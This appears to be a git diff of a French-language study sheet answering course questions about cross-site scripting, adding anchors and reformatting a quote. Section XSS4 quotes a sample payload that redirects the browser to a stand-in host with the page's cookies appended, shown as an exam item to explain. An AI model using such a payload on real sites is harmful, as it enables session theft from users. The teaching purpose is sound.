@@ -8,6 +8,8 @@ Ne lis pas ce bloc.
 
 _(Source : I183-TS2-ListeDesQuestions.pdf)_
 
+<a id="xss1"></a>
+
 ## **XSS1 — Définition**
 
 Une faille XSS (pour Cross-Site Scripting) est une vulnérabilité de sécurité web qui permet à un attaquant d'injecter du code malveillant (généralement du JavaScript) dans une page web visitée par d'autres utilisateurs.
@@ -23,6 +25,8 @@ C’est l’une des failles les plus fréquentes.
 Elle peut donner un accès complet à la session, modifier l’interface, ou détourner les formulaires.
 
 ---
+
+<a id="xss2"></a>
 
 ## **XSS2 — Protection en Node.js**
 
@@ -46,6 +50,8 @@ Une bonne CSP peut neutraliser **la majorité des XSS**.
 
 ---
 
+<a id="xss3"></a>
+
 ## **XSS3 — Une XSS peut-elle voler un mot de passe ?**
 
 Indirectement, oui.
@@ -61,10 +67,13 @@ En pratique, l’attaquant vole la **session**, ce qui équivaut à voler l'acc�
 
 ---
 
+<a id="xss4"></a>
+
 ## **XSS4 — Effet du script fourni**
 
-Le script : 
->`<script language=etmlscript>console.log("you have been hacked by Narut0"); window.location.href="https://spoof.cookie.com?data="+document.cookie;</script>`
+Le script :
+
+> `<script language=etmlscript>console.log("you have been hacked by Narut0"); window.location.href="https://spoof.cookie.com?data="+document.cookie;</script>`
 
 Si ce script est exécuté (malgré l'attribut `language` exotique) :
 
@@ -81,6 +90,8 @@ En plus :
 C’est l’un des scénarios XSS les plus classiques et les plus dangereux.
 
 ---
+
+<a id="xss5"></a>
 
 ## **XSS5 — DOM Injection**
 
